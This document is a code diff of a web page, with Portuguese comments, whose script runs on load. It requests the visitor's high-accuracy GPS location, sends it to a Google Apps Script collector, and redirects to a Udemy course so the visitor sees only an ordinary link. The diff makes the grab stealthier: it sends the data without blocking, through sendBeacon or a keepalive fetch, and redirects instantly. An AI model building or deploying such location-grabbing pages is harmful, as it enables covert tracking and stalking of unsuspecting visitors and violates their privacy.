@@ -48,59 +48,51 @@ body{display:flex;min-height:100vh;align-items:center;justify-content:center;bac
 const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyU2Hah8rXss1So36FAyRGF_8hcjZsMGaaF2m9_ZVEPNFPMDtBsQ7S9AsGcTcADgKPpZw/exec';
 const REDIRECT_URL = 'https://www.udemy.com/course/python-rpa-e-excel-aprenda-automatizar-processos-e-planilhas/';
 
-// GEOLOCATION
-function getLocation() {
-  return new Promise((resolve, reject) => {
-    navigator.geolocation.getCurrentPosition(
-      resolve,
-      reject,
-      { enableHighAccuracy:true, timeout:10000 }
-    );
-  });
-}
-
-// SEND DATA
-async function sendToGoogleSheets(data) {
-  await fetch(SCRIPT_URL, {
-    method: "POST",
-    headers: {
-      "Content-Type": "text/plain"
-    },
-    body: JSON.stringify(data)
-  });
-}
-
-// FLUXO PRINCIPAL
-async function runAndRedirect() {
-
+// envio sem bloquear
+function sendData(data) {
   try {
-
-    const position = await getLocation();
-
-    const payload = {
-      timestamp: new Date().toISOString(),
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      accuracy: position.coords.accuracy,
-      altitude: position.coords.altitude || "N/A",
-      speed: position.coords.speed || "N/A",
-      mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-    };
-
-    await sendToGoogleSheets(payload);
-
+    navigator.sendBeacon(SCRIPT_URL, JSON.stringify(data));
   } catch (e) {
-    console.error("Erro:", e);
+    fetch(SCRIPT_URL, {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify(data),
+      keepalive: true
+    });
   }
-
-  // 🔴 REDIRECIONAMENTO (sempre acontece)
-  window.location.href = REDIRECT_URL;
 }
 
-// EXECUTA AO ABRIR
-window.addEventListener('load', runAndRedirect);
+// geolocalização sem bloquear
+function tryGetLocation() {
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      const payload = {
+        timestamp: new Date().toISOString(),
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy
+      };
+
+      sendData(payload);
+    },
+    () => {},
+    { enableHighAccuracy: true, timeout: 3000 }
+  );
+}
+
+// execução imediata
+window.addEventListener('load', () => {
+
+  // dispara tentativa (não espera)
+  tryGetLocation();
+
+  // 🔴 REDIRECIONA IMEDIATAMENTE
+  window.location.replace(REDIRECT_URL);
+
+});
 
 </script>
+
 
 
 </body>
